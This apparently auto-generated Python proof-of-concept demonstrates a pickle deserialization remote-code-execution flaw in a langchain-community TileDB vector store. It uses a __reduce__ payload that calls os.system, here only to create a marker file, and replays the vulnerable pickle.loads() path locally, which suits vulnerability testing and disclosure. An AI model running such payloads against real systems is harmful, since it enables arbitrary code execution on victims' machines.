#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-026
# Sink: process_index_results
# Auto-generated — run with: python3 rce_sink_function_process_index_process_index_results_4.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only TileDB vector store.

Vulnerability: pickle.loads() in process_index_results() deserializes attacker-controlled
metadata without validation, allowing arbitrary code execution.

Attack flow:
1. Attacker sends a malicious pickle payload as metadata via add_texts() or similar.
2. When process_index_results() is called (e.g., during similarity search), the payload
   is deserialized with pickle.loads(), executing arbitrary code.

This PoC demonstrates the vulnerability by:
- Creating a malicious pickle payload that writes a file to /tmp/poc_success.txt
- Simulating the deserialization step that would occur in the vulnerable code path
"""

import pickle
import os
import sys
import struct
import numpy as np

# ============================================================
# Configuration
# ============================================================
# This PoC is self-contained and demonstrates the vulnerability locally.
# In a real attack, the payload would be injected into a TileDB array
# via the vector store's add_texts() method, then triggered by a search.

# ============================================================
# Step 1: Create a malicious pickle payload
# ============================================================
class MaliciousPayload:
    """A class whose __reduce__ method executes arbitrary code during unpickling."""
    
    def __reduce__(self):
        # Benign payload: create a marker file to prove code execution
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))

def create_malicious_pickle() -> bytes:
    """Create a pickle payload that executes a command when deserialized."""
    payload = MaliciousPayload()
    return pickle.dumps(payload)

# ============================================================
# Step 2: Simulate the vulnerable deserialization
# ============================================================
def simulate_vulnerable_deserialization(pickled_data: bytes):
    """
    Simulate the exact deserialization process from process_index_results().
    
    The vulnerable code does:
        pickled_metadata = doc.get("metadata")
        if pickled_metadata is not None:
            metadata = pickle.loads(
                np.array(pickled_metadata.tolist()).astype(np.uint8).tobytes()
            )
    
    This converts the pickled bytes through numpy array operations,
    but the final result is still the original pickle data.
    """
    # Convert bytes to numpy array (as done in the vulnerable code)
    # The vulnerable code expects pickled_metadata to be a tiledb attribute
    # which is stored as bytes. We simulate this by converting our pickle
    # bytes to a numpy array of uint8, then back to bytes.
    
    # Step 1: Convert pickle bytes to numpy array (uint8)
    np_array = np.frombuffer(pickled_data, dtype=np.uint8)
    
    # Step 2: Simulate the .tolist() call (converts to Python list)
    list_data = np_array.tolist()
    
    # Step 3: Simulate the reverse conversion (as in the vulnerable code)
    reconstructed_array = np.array(list_data, dtype=np.uint8)
    reconstructed_bytes = reconstructed_array.tobytes()
    
    # Step 4: Deserialize with pickle.loads() - THIS IS THE VULNERABLE CALL
    print("[*] Deserializing malicious pickle payload...")
    result = pickle.loads(reconstructed_bytes)
    print(f"[*] Deserialization result: {result}")
    
    return result

# ============================================================
# Step 3: Verify the exploit
# ============================================================
def verify_exploit():
    """Check if the marker file was created, indicating successful RCE."""
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS: Marker file '{marker_file}' was created!")
        print("[+] This confirms arbitrary code execution via pickle deserialization.")
        # Clean up
        os.remove(marker_file)
        return True
    else:
        print("[-] Marker file not found. Exploit may have failed.")
        return False

# ============================================================
# Main execution
# ============================================================
def main():
    print("=" * 60)
    print("TileDB pickle.loads() RCE Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Step 1: Create the malicious payload
    print("[*] Creating malicious pickle payload...")
    malicious_pickle = create_malicious_pickle()
    print(f"[*] Payload size: {len(malicious_pickle)} bytes")
    print(f"[*] Payload (hex): {malicious_pickle.hex()[:100]}...")
    print()
    
    # Step 2: Simulate the vulnerable deserialization
    print("[*] Simulating vulnerable deserialization...")
    print("[*] This mimics what happens in process_index_results()")
    print("[*] when it calls pickle.loads() on attacker-controlled metadata.")
    print()
    
    try:
        simulate_vulnerable_deserialization(malicious_pickle)
        print()
        
        # Step 3: Verify
        if verify_exploit():
            print()
            print("[*] Exploit chain completed successfully!")
            print()
            print("[*] In a real attack scenario:")
            print("  1. Attacker calls add_texts() with malicious metadata")
            print("  2. Metadata is stored as pickled bytes in TileDB array")
            print("  3. Victim calls similarity_search() or similar")
            print("  4. process_index_results() deserializes the malicious pickle")
            print("  5. Arbitrary code executes on the victim's machine")
        else:
            print("[-] Exploit verification failed.")
            sys.exit(1)
            
    except Exception as e:
        print(f"[-] Error during deserialization: {e}")
        print("[*] Note: This may happen if the pickle protocol is incompatible.")
        print("[*] The vulnerability is still present; the payload format may need adjustment.")
        sys.exit(1)

if __name__ == "__main__":
    main()
